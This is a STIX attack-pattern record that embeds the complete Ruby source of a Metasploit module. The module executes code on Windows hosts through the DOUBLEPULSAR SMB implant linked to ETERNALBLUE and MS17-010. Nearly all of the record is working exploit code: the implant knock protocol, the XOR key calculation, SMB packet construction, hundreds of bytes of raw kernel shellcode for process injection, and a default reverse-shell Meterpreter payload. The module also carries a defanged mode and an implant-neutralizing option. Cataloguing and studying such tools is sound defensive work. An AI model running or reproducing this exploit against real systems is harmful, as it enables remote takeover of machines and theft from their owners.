{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6c4c8fed-664d-4866-81cc-ff59cdbd0cbb",
    "created": "2024-08-14T16:56:08.700661Z",
    "modified": "2024-08-14T16:56:08.700665Z",
    "name": "SMB DOUBLEPULSAR Remote Code Execution",
    "description": " This module executes a Metasploit payload against the Equation Group's DOUBLEPULSAR implant for SMB as popularly deployed by ETERNALBLUE.  While this module primarily performs code execution against the implant the \"Neutralize implant\" target allows you to disable the implant. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/smb_doublepulsar_rce.rb",
            "external_id": "smb_doublepulsar_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-0143"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-0144"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-0145"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-0146"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-0147"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-0148"
        },
        {
            "source_name": "reference",
            "url": "https://zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html"
        },
        {
            "source_name": "reference",
            "url": "https://countercept.com/blog/analyzing-the-doublepulsar-kernel-dll-injection-technique/"
        },
        {
            "source_name": "reference",
            "url": "https://www.countercept.com/blog/doublepulsar-usermode-analysis-generic-reflective-dll-loader/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/countercept/doublepulsar-detection-script"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/countercept/doublepulsar-c2-traffic-decryptor"
        },
        {
            "source_name": "reference",
            "url": "https://gist.github.com/msuiche/50a36710ee59709d8c76fa50fc987be1"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Module::Deprecated\n\n  moved_from 'exploit/windows/smb/doublepulsar_rce'\n\n  MAX_SHELLCODE_SIZE = 4096\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'               => 'SMB DOUBLEPULSAR Remote Code Execution',\n      'Description'        => %q{\n        This module executes a Metasploit payload against the Equation Group's\n        DOUBLEPULSAR implant for SMB as popularly deployed by ETERNALBLUE.\n\n        While this module primarily performs code execution against the implant,\n        the \"Neutralize implant\" target allows you to disable the implant.\n      },\n      'Author'             => [\n        'Equation Group', # DOUBLEPULSAR implant\n        'Shadow Brokers', # Equation Group dump\n        'zerosum0x0',     # DOPU analysis and detection\n        'Luke Jennings',  # DOPU analysis and detection\n        'wvu',            # Metasploit module and arch detection\n        'Jacob Robles'    # Metasploit module and RCE help\n      ],\n      'References'         => [\n        ['MSB', 'MS17-010'],\n        ['CVE', '2017-0143'],\n        ['CVE', '2017-0144'],\n        ['CVE', '2017-0145'],\n        ['CVE', '2017-0146'],\n        ['CVE', '2017-0147'],\n        ['CVE', '2017-0148'],\n        ['URL', 'https://zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html'],\n        ['URL', 'https://countercept.com/blog/analyzing-the-doublepulsar-kernel-dll-injection-technique/'],\n        ['URL', 'https://www.countercept.com/blog/doublepulsar-usermode-analysis-generic-reflective-dll-loader/'],\n        ['URL', 'https://github.com/countercept/doublepulsar-detection-script'],\n        ['URL', 'https://github.com/countercept/doublepulsar-c2-traffic-decryptor'],\n        ['URL', 'https://gist.github.com/msuiche/50a36710ee59709d8c76fa50fc987be1']\n      ],\n      'DisclosureDate'     => '2017-04-14', # Shadow Brokers leak\n      'License'            => MSF_LICENSE,\n      'Platform'           => 'win',\n      'Arch'               => ARCH_X64,\n      'Privileged'         => true,\n      'Payload'            => {\n        'Space'            => MAX_SHELLCODE_SIZE - kernel_shellcode_size,\n        'DisableNops'      => true\n      },\n      'Targets'            => [\n        ['Execute payload (x64)',\n          'DefaultOptions' => {\n            'EXITFUNC'     => 'thread',\n            'PAYLOAD'      => 'windows/x64/meterpreter/reverse_tcp'\n          }\n        ],\n        ['Neutralize implant',\n          'DefaultOptions' => {\n            'PAYLOAD'      => nil # XXX: \"Unset\" generic payload\n          }\n        ]\n      ],\n      'DefaultTarget'      => 0,\n      'Notes'              => {\n        'AKA'              => ['DOUBLEPULSAR'],\n        'RelatedModules'   => [\n          'auxiliary/scanner/smb/smb_ms17_010',\n          'exploit/windows/smb/ms17_010_eternalblue'\n        ],\n        'Stability'        => [CRASH_OS_DOWN],\n        'Reliability'      => [REPEATABLE_SESSION],\n        'SideEffects'      => []\n      }\n    ))\n\n    register_advanced_options([\n      OptBool.new('DefangedMode',  [true, 'Run in defanged mode', true]),\n      OptString.new('ProcessName', [true, 'Process to inject payload into', 'spoolsv.exe'])\n    ])\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n  OPCODES = {\n    ping: 0x23,\n    exec: 0xc8,\n    kill: 0x77\n  }.freeze\n\n  STATUS_CODES = {\n    not_detected:   0x00,\n    success:        0x10,\n    invalid_params: 0x20,\n    alloc_failure:  0x30\n  }.freeze\n\n  def calculate_doublepulsar_status(m1, m2)\n    STATUS_CODES.key(m2.to_i - m1.to_i)\n  end\n\n  # algorithm to calculate the XOR Key for DoublePulsar knocks\n  def calculate_doublepulsar_xor_key(s)\n    x = (2 * s ^ (((s & 0xff00 | (s << 16)) << 8) | (((s >> 16) | s & 0xff0000) >> 8)))\n    x & 0xffffffff  # this line was added just to truncate to 32 bits\n  end\n\n  # The arch is adjacent to the XOR key in the SMB signature\n  def calculate_doublepulsar_arch(s)\n    s == 0 ? ARCH_X86 : ARCH_X64\n  end\n\n  def generate_doublepulsar_timeout(op)\n    k = SecureRandom.random_bytes(4).unpack1('V')\n    0xff & (op - ((k & 0xffff00) >> 16) - (0xffff & (k & 0xff00) >> 8)) | k & 0xffff00\n  end\n\n  def generate_doublepulsar_param(op, body)\n    case OPCODES.key(op)\n    when :ping, :kill\n      \"\\x00\" * 12\n    when :exec\n      Rex::Text.xor([@xor_key].pack('V'), [body.length, body.length, 0].pack('V*'))\n    end\n  end\n\n  def check\n    ipc_share = \"\\\\\\\\#{rhost}\\\\IPC$\"\n\n    @tree_id = do_smb_setup_tree(ipc_share)\n    vprint_good(\"Connected to #{ipc_share} with TID = #{@tree_id}\")\n    vprint_status(\"Target OS is #{smb_peer_os}\")\n\n    print_status('Sending ping to DOUBLEPULSAR')\n    code, signature1, signature2 = do_smb_doublepulsar_pkt\n    msg = 'Host is likely INFECTED with DoublePulsar!'\n\n    case calculate_doublepulsar_status(@multiplex_id, code)\n    when :success\n      @xor_key = calculate_doublepulsar_xor_key(signature1)\n      @arch = calculate_doublepulsar_arch(signature2)\n\n      arch_str =\n        case @arch\n        when ARCH_X86\n          'x86 (32-bit)'\n        when ARCH_X64\n          'x64 (64-bit)'\n        end\n\n      print_warning(\"#{msg} - Arch: #{arch_str}, XOR Key: 0x#{@xor_key.to_s(16).upcase}\")\n      CheckCode::Vulnerable\n    when :not_detected\n      print_error('DOUBLEPULSAR not detected or disabled')\n      CheckCode::Safe\n    else\n      print_error('An unknown error occurred')\n      CheckCode::Unknown\n    end\n  end\n\n  def exploit\n    if datastore['DefangedMode']\n      warning = <<~EOF\n\n\n        Are you SURE you want to execute code against a nation-state implant?\n        You MAY contaminate forensic evidence if there is an investigation.\n\n        Disable the DefangedMode option if you have authorization to proceed.\n      EOF\n\n      fail_with(Failure::BadConfig, warning)\n    end\n\n    # No ForceExploit because @tree_id and @xor_key are required\n    unless check == CheckCode::Vulnerable\n      fail_with(Failure::NotVulnerable, 'Unable to proceed without DOUBLEPULSAR')\n    end\n\n    case target.name\n    when 'Execute payload (x64)'\n      unless @xor_key\n        fail_with(Failure::NotFound, 'XOR key not found')\n      end\n\n      if @arch == ARCH_X86\n        fail_with(Failure::NoTarget, 'x86 is not a supported target')\n      end\n\n      print_status(\"Generating kernel shellcode with #{datastore['PAYLOAD']}\")\n      shellcode = make_kernel_user_payload(payload.encoded, datastore['ProcessName'])\n      shellcode << rand_text(MAX_SHELLCODE_SIZE - shellcode.length)\n      vprint_status(\"Total shellcode length: #{shellcode.length} bytes\")\n\n      print_status(\"Encrypting shellcode with XOR key 0x#{@xor_key.to_s(16).upcase}\")\n      xor_shellcode = Rex::Text.xor([@xor_key].pack('V'), shellcode)\n\n      print_status('Sending shellcode to DOUBLEPULSAR')\n      code, _signature1, _signature2 = do_smb_doublepulsar_pkt(OPCODES[:exec], xor_shellcode)\n    when 'Neutralize implant'\n      return neutralize_implant\n    end\n\n    case calculate_doublepulsar_status(@multiplex_id, code)\n    when :success\n      print_good('Payload execution successful')\n    when :invalid_params\n      fail_with(Failure::BadConfig, 'Invalid parameters were specified')\n    when :alloc_failure\n      fail_with(Failure::PayloadFailed, 'An allocation failure occurred')\n    else\n      fail_with(Failure::Unknown, 'An unknown error occurred')\n    end\n  ensure\n    disconnect\n  end\n\n  def neutralize_implant\n    print_status('Neutralizing DOUBLEPULSAR')\n    code, _signature1, _signature2 = do_smb_doublepulsar_pkt(OPCODES[:kill])\n\n    case calculate_doublepulsar_status(@multiplex_id, code)\n    when :success\n      print_good('Implant neutralization successful')\n    else\n      fail_with(Failure::Unknown, 'An unknown error occurred')\n    end\n  end\n\n  def do_smb_setup_tree(ipc_share)\n    connect(versions: [1])\n\n    # logon as user \\\n    simple.login(datastore['SMBName'], datastore['SMBUser'], datastore['SMBPass'], datastore['SMBDomain'])\n\n    # connect to IPC$\n    simple.connect(ipc_share)\n\n    # return tree\n    simple.shares[ipc_share]\n  end\n\n  def do_smb_doublepulsar_pkt(opcode = OPCODES[:ping], body = nil)\n    # make doublepulsar knock\n    pkt = make_smb_trans2_doublepulsar(opcode, body)\n\n    sock.put(pkt)\n    bytes = sock.get_once\n\n    return unless bytes\n\n    # convert packet to response struct\n    pkt = Rex::Proto::SMB::Constants::SMB_TRANS_RES_HDR_PKT.make_struct\n    pkt.from_s(bytes[4..-1])\n\n    return pkt['SMB'].v['MultiplexID'], pkt['SMB'].v['Signature1'], pkt['SMB'].v['Signature2']\n  end\n\n  def make_smb_trans2_doublepulsar(opcode, body)\n    setup_count = 1\n    setup_data = [0x000e].pack('v')\n\n    param = generate_doublepulsar_param(opcode, body)\n    data = param + body.to_s\n\n    pkt = Rex::Proto::SMB::Constants::SMB_TRANS2_PKT.make_struct\n    simple.client.smb_defaults(pkt['Payload']['SMB'])\n\n    base_offset = pkt.to_s.length + (setup_count * 2) - 4\n    param_offset = base_offset\n    data_offset = param_offset + param.length\n\n    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_TRANSACTION2\n    pkt['Payload']['SMB'].v['Flags1'] = 0x18\n    pkt['Payload']['SMB'].v['Flags2'] = 0xc007\n\n    @multiplex_id = rand(0xffff)\n\n    pkt['Payload']['SMB'].v['WordCount'] = 14 + setup_count\n    pkt['Payload']['SMB'].v['TreeID'] = @tree_id\n    pkt['Payload']['SMB'].v['MultiplexID'] = @multiplex_id\n\n    pkt['Payload'].v['ParamCountTotal'] = param.length\n    pkt['Payload'].v['DataCountTotal'] = body.to_s.length\n    pkt['Payload'].v['ParamCountMax'] = 1\n    pkt['Payload'].v['DataCountMax'] = 0\n    pkt['Payload'].v['ParamCount'] = param.length\n    pkt['Payload'].v['ParamOffset'] = param_offset\n    pkt['Payload'].v['DataCount'] = body.to_s.length\n    pkt['Payload'].v['DataOffset'] = data_offset\n    pkt['Payload'].v['SetupCount'] = setup_count\n    pkt['Payload'].v['SetupData'] = setup_data\n    pkt['Payload'].v['Timeout'] = generate_doublepulsar_timeout(opcode)\n    pkt['Payload'].v['Payload'] = data\n\n    pkt.to_s\n  end\n\n  # ring3 = user mode encoded payload\n  # proc_name = process to inject APC into\n  def make_kernel_user_payload(ring3, proc_name)\n    sc = make_kernel_shellcode(proc_name)\n\n    sc << [ring3.length].pack('S<')\n    sc << ring3\n\n    sc\n  end\n\n  def generate_process_hash(process)\n    # x64_calc_hash from external/source/shellcode/windows/multi_arch_kernel_queue_apc.asm\n    proc_hash = 0\n    process << \"\\x00\"\n\n    process.each_byte do |c|\n      proc_hash = ror(proc_hash, 13)\n      proc_hash += c\n    end\n\n    [proc_hash].pack('l<')\n  end\n\n  def ror(dword, bits)\n    (dword >> bits | dword << (32 - bits)) & 0xFFFFFFFF\n  end\n\n  def make_kernel_shellcode(proc_name)\n    # see: external/source/shellcode/windows/multi_arch_kernel_queue_apc.asm\n    # Length: 780 bytes\n    \"\\x31\\xc9\\x41\\xe2\\x01\\xc3\\x56\\x41\\x57\\x41\\x56\\x41\\x55\\x41\\x54\\x53\" \\\n    \"\\x55\\x48\\x89\\xe5\\x66\\x83\\xe4\\xf0\\x48\\x83\\xec\\x20\\x4c\\x8d\\x35\\xe3\" \\\n    \"\\xff\\xff\\xff\\x65\\x4c\\x8b\\x3c\\x25\\x38\\x00\\x00\\x00\\x4d\\x8b\\x7f\\x04\" \\\n    \"\\x49\\xc1\\xef\\x0c\\x49\\xc1\\xe7\\x0c\\x49\\x81\\xef\\x00\\x10\\x00\\x00\\x49\" \\\n    \"\\x8b\\x37\\x66\\x81\\xfe\\x4d\\x5a\\x75\\xef\\x41\\xbb\\x5c\\x72\\x11\\x62\\xe8\" \\\n    \"\\x18\\x02\\x00\\x00\\x48\\x89\\xc6\\x48\\x81\\xc6\\x08\\x03\\x00\\x00\\x41\\xbb\" \\\n    \"\\x7a\\xba\\xa3\\x30\\xe8\\x03\\x02\\x00\\x00\\x48\\x89\\xf1\\x48\\x39\\xf0\\x77\" \\\n    \"\\x11\\x48\\x8d\\x90\\x00\\x05\\x00\\x00\\x48\\x39\\xf2\\x72\\x05\\x48\\x29\\xc6\" \\\n    \"\\xeb\\x08\\x48\\x8b\\x36\\x48\\x39\\xce\\x75\\xe2\\x49\\x89\\xf4\\x31\\xdb\\x89\" \\\n    \"\\xd9\\x83\\xc1\\x04\\x81\\xf9\\x00\\x00\\x01\\x00\\x0f\\x8d\\x66\\x01\\x00\\x00\" \\\n    \"\\x4c\\x89\\xf2\\x89\\xcb\\x41\\xbb\\x66\\x55\\xa2\\x4b\\xe8\\xbc\\x01\\x00\\x00\" \\\n    \"\\x85\\xc0\\x75\\xdb\\x49\\x8b\\x0e\\x41\\xbb\\xa3\\x6f\\x72\\x2d\\xe8\\xaa\\x01\" \\\n    \"\\x00\\x00\\x48\\x89\\xc6\\xe8\\x50\\x01\\x00\\x00\\x41\\x81\\xf9\" +\n    generate_process_hash(proc_name.upcase) +\n    \"\\x75\\xbc\\x49\\x8b\\x1e\\x4d\\x8d\\x6e\\x10\\x4c\\x89\\xea\\x48\\x89\\xd9\" \\\n    \"\\x41\\xbb\\xe5\\x24\\x11\\xdc\\xe8\\x81\\x01\\x00\\x00\\x6a\\x40\\x68\\x00\\x10\" \\\n    \"\\x00\\x00\\x4d\\x8d\\x4e\\x08\\x49\\xc7\\x01\\x00\\x10\\x00\\x00\\x4d\\x31\\xc0\" \\\n    \"\\x4c\\x89\\xf2\\x31\\xc9\\x48\\x89\\x0a\\x48\\xf7\\xd1\\x41\\xbb\\x4b\\xca\\x0a\" \\\n    \"\\xee\\x48\\x83\\xec\\x20\\xe8\\x52\\x01\\x00\\x00\\x85\\xc0\\x0f\\x85\\xc8\\x00\" \\\n    \"\\x00\\x00\\x49\\x8b\\x3e\\x48\\x8d\\x35\\xe9\\x00\\x00\\x00\\x31\\xc9\\x66\\x03\" \\\n    \"\\x0d\\xd7\\x01\\x00\\x00\\x66\\x81\\xc1\\xf9\\x00\\xf3\\xa4\\x48\\x89\\xde\\x48\" \\\n    \"\\x81\\xc6\\x08\\x03\\x00\\x00\\x48\\x89\\xf1\\x48\\x8b\\x11\\x4c\\x29\\xe2\\x51\" \\\n    \"\\x52\\x48\\x89\\xd1\\x48\\x83\\xec\\x20\\x41\\xbb\\x26\\x40\\x36\\x9d\\xe8\\x09\" \\\n    \"\\x01\\x00\\x00\\x48\\x83\\xc4\\x20\\x5a\\x59\\x48\\x85\\xc0\\x74\\x18\\x48\\x8b\" \\\n    \"\\x80\\xc8\\x02\\x00\\x00\\x48\\x85\\xc0\\x74\\x0c\\x48\\x83\\xc2\\x4c\\x8b\\x02\" \\\n    \"\\x0f\\xba\\xe0\\x05\\x72\\x05\\x48\\x8b\\x09\\xeb\\xbe\\x48\\x83\\xea\\x4c\\x49\" \\\n    \"\\x89\\xd4\\x31\\xd2\\x80\\xc2\\x90\\x31\\xc9\\x41\\xbb\\x26\\xac\\x50\\x91\\xe8\" \\\n    \"\\xc8\\x00\\x00\\x00\\x48\\x89\\xc1\\x4c\\x8d\\x89\\x80\\x00\\x00\\x00\\x41\\xc6\" \\\n    \"\\x01\\xc3\\x4c\\x89\\xe2\\x49\\x89\\xc4\\x4d\\x31\\xc0\\x41\\x50\\x6a\\x01\\x49\" \\\n    \"\\x8b\\x06\\x50\\x41\\x50\\x48\\x83\\xec\\x20\\x41\\xbb\\xac\\xce\\x55\\x4b\\xe8\" \\\n    \"\\x98\\x00\\x00\\x00\\x31\\xd2\\x52\\x52\\x41\\x58\\x41\\x59\\x4c\\x89\\xe1\\x41\" \\\n    \"\\xbb\\x18\\x38\\x09\\x9e\\xe8\\x82\\x00\\x00\\x00\\x4c\\x89\\xe9\\x41\\xbb\\x22\" \\\n    \"\\xb7\\xb3\\x7d\\xe8\\x74\\x00\\x00\\x00\\x48\\x89\\xd9\\x41\\xbb\\x0d\\xe2\\x4d\" \\\n    \"\\x85\\xe8\\x66\\x00\\x00\\x00\\x48\\x89\\xec\\x5d\\x5b\\x41\\x5c\\x41\\x5d\\x41\" \\\n    \"\\x5e\\x41\\x5f\\x5e\\xc3\\xe9\\xb5\\x00\\x00\\x00\\x4d\\x31\\xc9\\x31\\xc0\\xac\" \\\n    \"\\x41\\xc1\\xc9\\x0d\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\x01\\xc1\\x38\\xe0\\x75\" \\\n    \"\\xec\\xc3\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\" \\\n    \"\\x20\\x48\\x8b\\x12\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x45\\x31\\xc9\" \\\n    \"\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\" \\\n    \"\\xe2\\xee\\x45\\x39\\xd9\\x75\\xda\\x4c\\x8b\\x7a\\x20\\xc3\\x4c\\x89\\xf8\\x41\" \\\n    \"\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x89\\xc2\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\" \\\n    \"\\x80\\x88\\x00\\x00\\x00\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\" \\\n    \"\\x49\\x01\\xd0\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\xe8\\x78\\xff\" \\\n    \"\\xff\\xff\\x45\\x39\\xd9\\x75\\xec\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\" \\\n    \"\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\" \\\n    \"\\x01\\xd0\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5b\\x41\\x53\\xff\\xe0\\x56\" \\\n    \"\\x41\\x57\\x55\\x48\\x89\\xe5\\x48\\x83\\xec\\x20\\x41\\xbb\\xda\\x16\\xaf\\x92\" \\\n    \"\\xe8\\x4d\\xff\\xff\\xff\\x31\\xc9\\x51\\x51\\x51\\x51\\x41\\x59\\x4c\\x8d\\x05\" \\\n    \"\\x1a\\x00\\x00\\x00\\x5a\\x48\\x83\\xec\\x20\\x41\\xbb\\x46\\x45\\x1b\\x22\\xe8\" \\\n    \"\\x68\\xff\\xff\\xff\\x48\\x89\\xec\\x5d\\x41\\x5f\\x5e\\xc3\"\n  end\n\n  def kernel_shellcode_size\n    make_kernel_shellcode('').length\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2017-04-14, # Shadow Brokers leak",
    "x_mitre_platforms": [
        "win'"
    ]
}